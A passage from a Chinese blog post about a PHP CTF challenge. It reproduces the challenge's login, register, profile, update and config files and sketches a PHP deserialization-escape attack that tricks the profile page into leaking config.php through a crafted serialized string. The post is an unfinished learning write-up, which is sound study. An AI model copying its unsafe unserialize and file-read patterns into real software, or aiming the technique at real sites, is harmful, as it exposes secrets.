class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">LOGIN</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line">			<span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">			&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">h3</span>&gt;<span class="title">Register</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">			&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">REGISTER</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">		&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">	&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#update.php</span><br><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">		die(&#x27;Login First&#x27;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">		if(!preg_match(&#x27;/^\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))</span><br><span class="line">			die(&#x27;Invalid phone&#x27;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))</span><br><span class="line">			die(&#x27;Invalid email&#x27;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&#x27;photo&#x27;];</span><br><span class="line">		if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)</span><br><span class="line">			die(&#x27;Photo size error&#x27;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br><span class="line">		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">			&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>seay扫了一下</p>
<p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824201836505.png" alt="image-20210824201836505"></p>
<p>这里将上传的文件<code>$profile[&#39;photo&#39;]</code>中的内容读取后进行<code>base64</code>，然后输出，那么思路就很明确了：上面还有个反序列化<code>unserialize</code>，感觉有戏，如果让 <code>$profile[&#39;photo&#39;]</code>的值为<code>&#39;config.php&#39;</code>，这样就可以将<code>config.php</code>的源码经过base64编码后输出，就可以得到flag了。可以对<code>photo</code>进行操作的地方在<code>update.php</code>，有phone、email、nickname和photo这几个</p>
<p>那自然就是反序列化逃逸的事了    </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$profile = &#x27;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:8:&quot;sea_sand&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;&#x27;;</span><br><span class="line">print_r(unserialize($profile));</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line"> [phone] =&gt; 12345678901</span><br><span class="line"> [email] =&gt; ss@q.com</span><br><span class="line"> [nickname] =&gt; sea_sand</span><br><span class="line"> [photo] =&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本地想运行连不上数据库       慢慢研究  8  看别人wp去了</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">One</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/08/24/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/">http://example.com/2021/08/24/%E4%BB%8E%E4%B8%8B%E6%B0%B4%E9%81%93%E5%B0%9D%E8%AF%95%E7%9C%8B%E6%87%82php%E5%92%8C%E7%BB%83%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/php/">php</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> Donate</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/"><img class="prev-cover" src="/imgg/5.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">php反序列化练习</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"><img class="next-cover" src="/imgg/8.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Redis未授权复现与利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/" title="phpinfo信息利用"><img class="cover" src="/imgg/4.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-28</div><div class="title">phpinfo信息利用</div></div></a></div><div><a href="/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="php反序列化漏洞总结"><img class="cover" src="/imgg/7.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-25</div><div class="title">php反序列化漏洞总结</div></div></a></div><div><a href="/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/" title="php反序列化练习"><img class="cover" src="/imgg/5.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-25</div><div class="title">php反序列化练习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">One</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/paleonec" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">博客重构中。。。。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%A9"><span class="toc-number">1.</span> <span class="toc-text">第一天</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%A0%87%E8%AE%B0"><span class="toc-number">1.0.0.0.0.1.</span> <span class="toc-text">代码标记</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#PHP%E6%B3%A8%E9%87%8A"><span class="toc-number">1.0.0.0.0.2.</span> <span class="toc-text">PHP注释</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">变量</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%A2%84%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F"><span class="toc-number">1.0.0.0.1.1.</span> <span class="toc-text">预定义变量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F"><span class="toc-number">1.0.0.0.1.2.</span> <span class="toc-text">可变变量</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E4%BC%A0%E5%80%BC"><span class="toc-number">1.0.0.0.2.</span> <span class="toc-text">变量传值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E9%87%8F"><span class="toc-number">1.0.0.0.3.</span> <span class="toc-text">常量</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%B8%B8%E9%87%8F"><span class="toc-number">1.0.0.0.3.1.</span> <span class="toc-text">系统常量</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%87%AA%E6%93%8D%E4%BD%9C%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.0.0.0.3.2.</span> <span class="toc-text">自操作运算符</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" 